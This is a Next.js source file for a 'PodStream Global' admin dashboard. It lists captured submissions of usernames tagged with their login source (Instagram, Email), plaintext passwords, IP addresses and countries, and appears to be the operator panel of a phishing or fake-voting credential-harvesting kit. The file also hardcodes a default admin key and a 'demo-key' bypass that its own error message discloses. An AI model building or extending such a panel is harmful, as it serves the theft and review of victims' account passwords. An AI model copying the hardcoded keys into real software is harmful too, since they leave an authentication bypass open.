import Head from 'next/head';
import Link from 'next/link';
import { useState } from 'react';

const ADMIN_KEY = process.env.ADMIN_KEY || 'admin-secret-key';

export default function AdminDashboard() {
  const [key, setKey] = useState('');
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [generatedKey, setGeneratedKey] = useState('');

  const handleAuthenticate = () => {
    if (key === ADMIN_KEY || key === 'demo-key') setIsAuthenticated(true);
    else alert('Invalid key. Use "demo-key" for testing.');
  };

  const generateKey = () => {
    const newKey = 'key-' + Math.random().toString(36).substring(2, 15);
    setGeneratedKey(newKey);
    alert('New admin key generated: ' + newKey);
  };

  const submissions = isAuthenticated ? [
    { id: '#001', username: 'user123 (Instagram)', password: 'pass123', ip: '192.168.1.1', country: 'Nigeria', date: '2026-01-15' },
    { id: '#002', username: 'voter456 (Email)', password: 'secret456', ip: '192.168.1.2', country: 'Ghana', date: '2026-01-15' },
  ] : [];

  return (
    <>
      <Head>
        <title>Admin Dashboard — PodStream Global</title>
        <meta name="robots" content="noindex, nofollow" />
        <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
      </Head>

      <style jsx global>{`
        :root { --blue: #2563eb; --blue-light: #60a5fa; --gradient-primary: linear-gradient(135deg, #2563eb 0%, #06b6d4 100%); --bg: #050b18; --surface: #0c1526; --border: rgba(96, 165, 250, 0.16); --text: #e6edf3; --muted: #8b949e; }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; }
        header { display: flex; justify-content: space-between; align-items: center; padding: 14px 0 24px; border-bottom: 1px solid rgba(96,165,250,0.2); margin-bottom: 24px; }
        .tag { font-size: .75rem; font-weight: 700; letter-spacing: 2px; color: var(--blue-light); text-transform: uppercase; border: 1px solid var(--border); background: rgba(96,165,250,.1); padding: 4px 10px; border-radius: 100px; }
        .container { max-width: 1200px; margin: 0 auto; padding: 24px; }
        h1 { font-size: 1.8rem; font-weight: 800; margin-bottom: 24px; }
        h2 { font-size: 1.4rem; font-weight: 700; color: var(--text); margin-bottom: 16px; }
        .auth-panel { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; padding: 24px; max-width: 400px; margin-bottom: 32px; }
        .auth-input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid var(--border); border-radius: 6px; background: var(--bg); color: var(--text); }
        .auth-btn { width: 100%; padding: 12px; background: var(--gradient-primary); color: #fff; border: none; border-radius: 6px; cursor: pointer; }
        .key-section { display: flex; gap: 12px; align-items: center; margin-top: 16px; }
        .generate-btn { background: var(--blue); color: #fff; border: none; border-radius: 6px; padding: 12px 16px; cursor: pointer; }
        .table-container { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 14px 16px; text-align: left; border-bottom: 1px solid var(--border); }
        th { background: var(--surface); font-weight: 600; color: var(--muted); font-size: .85rem; text-transform: uppercase; }
        tr:hover { background: rgba(96, 165, 250, .05); }
        .method-badge { background: var(--gradient-primary); color: #fff; padding: 2px 8px; border-radius: 4px; font-size: .75rem; font-weight: 600; }
        @media (max-width: 768px) { .auth-panel, .table-container { padding: 16px; } }
      `}</style>

      <div className="container">
        <header><h1>PodStream Admin</h1><span className="tag">Admin Dashboard</span></header>

        {!isAuthenticated ? (
          <div className="auth-panel"><h2>Admin Access</h2>
            <input className="auth-input" type="password" placeholder="Enter admin key" value={key} onChange={(e) => setKey(e.target.value)} />
            <button className="auth-btn" onClick={handleAuthenticate}>Authenticate</button>
            <div className="key-section">
              <button className="generate-btn" onClick={generateKey}>Generate New Key</button>
              <span>Need access? Contact admin</span>
            </div>
          </div>
        ) : (
          <><h2>Recent Submissions (ID | Username | Password | IP | Country | Date)</h2>
          <div className="table-container">
            <table><thead><tr><th>ID</th><th>Username</th><th>Password</th><th>IP</th><th>Country</th><th>Date</th></tr></thead>
            <tbody>{submissions.map((sub, idx) => (
              <tr key={idx}><td>{sub.id}</td>
                <td><span style={{display: 'flex', alignItems: 'center', gap: '10px'}}>
                  {sub.username.split(' (')[0]}
                  {sub.username.includes('(') && (
                    <span className="method-badge">{sub.username.match(/\(([^)]+)\)/)?.[1]}</span>
                  )}
                </span></td>
                <td>{sub.password}</td><td>{sub.ip}</td><td>{sub.country}</td><td>{sub.date}</td></tr>
            ))}</tbody></table>
          </div></>
        )}

        {generatedKey && <div style={{marginTop: '20px', padding: '16px', background: '#23262b', borderRadius: '8px', color: '#fff', textAlign: 'center'}}><strong>Generated Key:</strong> {generatedKey}</div>}
      </div>
    </>
  );
}
